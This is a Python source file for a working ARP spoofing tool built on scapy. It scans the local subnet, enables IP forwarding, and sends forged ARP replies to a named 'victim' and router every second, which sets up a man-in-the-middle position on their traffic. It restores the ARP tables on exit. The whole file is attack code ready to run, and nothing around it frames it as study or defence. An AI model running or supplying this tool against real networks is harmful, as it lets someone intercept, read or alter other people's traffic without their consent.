#!/usr/bin/env python
import os
import sys
import time
import argparse
import logging
import socket
import scapy.all as scapy


def setup_logging(verbose=False):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')


def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def discover_targets():
    logging.info("Discovering targets on the network...")
    targets = []

    # Send ARP requests to discover active hosts
    ans, _ = scapy.arping("192.168.1.1/24")  # Adjust the subnet according to your network
    for pkt in ans:
        targets.append(pkt[1].psrc)

    logging.info("Discovered targets: %s", targets)
    return targets


def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, retry=3)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except IndexError:
        pass


def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
        logging.info("Sent spoofed ARP packet to %s", target_ip)
    else:
        logging.error("Failed to get target MAC address for %s", target_ip)


def restore_arp_tables(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        logging.info("ARP tables restored for %s", destination_ip)
    else:
        logging.error("Failed to restore ARP tables for %s", destination_ip)


def enable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "0\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("1\n")
                    logging.info("IP forwarding enabled")
    except IOError:
        logging.exception("Failed to enable IP forwarding")


def disable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "1\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("0\n")
                    logging.info("IP forwarding disabled")
    except IOError:
        logging.exception("Failed to disable IP forwarding")


def main(args):
    victim_ip = args.victim_ip
    router_ip = args.router_ip
    verbose = args.verbose

    setup_logging(verbose)

    if not validate_ip(victim_ip) or not validate_ip(router_ip):
        logging.error("Invalid IP address format")
        sys.exit(1)

    try:
        enable_ip_forwarding()

        logging.info("Spoofing ARP tables...")
        while True:
            arp_spoof(victim_ip, router_ip)
            arp_spoof(router_ip, victim_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Detected Ctrl+C, Restoring ARP tables...")
        restore_arp_tables(victim_ip, router_ip)
        restore_arp_tables(router_ip, victim_ip)
        disable_ip_forwarding()
        sys.exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoofing tool")
    parser.add_argument("victim_ip", help="IP address of the victim")
    parser.add_argument("router_ip", help="IP address of the router")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    args = parser.parse_args()

    # If victim and router IP addresses are not provided, attempt to discover them automatically
    if not args.victim_ip or not args.router_ip:
        targets = discover_targets()
        if len(targets) < 2:
            logging.error("Unable to discover sufficient targets. Please specify IP addresses manually.")
            sys.exit(1)
        args.victim_ip = targets[0]
        args.router_ip = targets[1]

    main(args)
